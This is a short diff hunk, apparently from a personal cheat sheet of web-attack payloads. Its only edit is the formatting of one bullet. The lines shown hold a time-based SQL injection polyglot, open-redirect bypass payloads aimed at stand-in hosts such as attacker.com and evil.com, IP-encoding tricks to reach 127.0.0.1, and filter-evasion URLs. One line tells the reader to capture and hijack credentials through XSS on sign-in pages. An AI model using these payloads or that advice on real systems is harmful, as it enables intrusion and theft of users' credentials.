@@ -11,7 +11,7 @@ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(
 - when parameter value is prefixed in location header:
 	http://victim.com?url=//attacker.com -- > Location: //attacker.com-foobar
 	http://victim.com?url=//attacker.com/? -- > Location: //attacker.com/?-foobar
-	always add slash at the end of the payload
+- Always add slash at the end of the payload
 - when you find xss in open redirection in signon/in pages, just capture the credentials and hijack them.
 - Open Redirect Bypass: /path?redirect=//2130706433 or /path?redirect=//0x7f000001 It will redirect you to 127.0.0.1
 - bypass most filters with this payload: http:http:evil[.]com http:/evil%252ecom ///www.x.com@evil.com
